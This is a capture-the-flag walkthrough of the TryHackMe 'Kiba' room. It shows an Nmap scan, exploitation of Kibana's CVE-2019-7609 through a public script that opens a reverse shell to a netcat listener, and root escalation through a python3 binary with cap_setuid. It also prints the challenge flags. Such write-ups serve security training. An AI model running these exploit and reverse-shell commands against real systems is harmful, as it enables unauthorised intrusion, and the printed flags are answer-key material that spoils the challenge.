# kiba

Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.

# [Task 1] Flags

Are you able to complete the challenge? The machine may take up to 7 minutes to boot and configure

## #1 - What is the vulnerability that is specific to programming languages with prototype-based inheritance?

Answer: `prototype pollution`

## #2 - What is the version of visualization dashboard installed in the server?

Scanning the target with Nmap reveals several open ports, 1 of which hosting Kibana (port 5601).

~~~
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
5044/tcp open  lxi-evntsvc?
5601/tcp open  esmagent?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     undefined: undefined
|     Date: Thu, 17 Sep 2020 18:55:56 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     undefined: undefined
|     Date: Thu, 17 Sep 2020 18:55:50 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     undefined: undefined
|     Date: Thu, 17 Sep 2020 18:55:53 GMT
|_    {"statusCode":404,"error":"Not Found"}
~~~

Connect to http://10.10.113.146:5601 and go to "management". The version of Kibana is displayed on the top left corner.

Answer: `6.5.4`

## #3 - What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

Kibana versions before 5.6.15 and 6.6.1 contain an arbitrary code execution flaw in the Timelion visualizer. An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.

Answer: `CVE-2019-7609`

## #4 - Compromise the machine and locate user.txt

Start a listener (`rlwrap nc -nlvp 4444`) and run the exploit:

~~~
kali@kali:/data/kiba/files$ git clone https://github.com/LandGrey/CVE-2019-7609.git
kali@kali:/data/kiba/files$ cd CVE-2019-7609
kali@kali:/data/kiba/files/CVE-2019-7609$ python CVE-2019-7609-kibana-rce.py -u http://10.10.113.146:5601 -host 10.8.50.72 -port 4444 --shell
[+] http://10.10.113.146:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
[+] reverse shell completely! please check session on: 10.8.50.72:4444
~~~

Now we have a shell:

~~~
kali@kali:/data/kiba$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.113.146] 45840
bash: cannot set terminal process group (980): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kiba@ubuntu:/home/kiba/kibana/bin$ ls -la /home
ls -la /home
total 12
drwxr-xr-x  3 root root 4096 Mar 31 10:41 .
drwxr-xr-x 22 root root 4096 Mar 31 17:13 ..
drwxr-xr-x  6 kiba kiba 4096 Mar 31 22:59 kiba
kiba@ubuntu:/home/kiba/kibana/bin$ cat /home/kiba/user.txt
cat /home/kiba/user.txt
THM{1s_easy_pwn3d_k1bana_w1th_rce}
~~~

## #5 - Capabilities is a concept that provides a security system that allows "divide" root privileges into different values

No answer here

## #6 - How would you recursively list all of these capabilities?

Answer: `getcap -r /`

## #7 - Escalate privileges and obtain root.txt

Checking the capabilities reveals a custom python3 installation in `/home/kiba/.hackmeplease/`:

~~~
kiba@ubuntu:/home/kiba/kibana/bin$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
~~~

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities) what we can do with `python` related to capabilities reveals that we can escalate our privileges to root:

~~~
kiba@ubuntu:/home/kiba/kibana/bin$ /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
<please/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'         
id
uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
~~~

Let's get a better shell and get the root flag:

~~~
SHELL=/bin/bash script -q /dev/null
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@ubuntu:/home/kiba/kibana/bin# cat /root/root.txt
cat /root/root.txt
THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
~~~

Answer: `THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}`
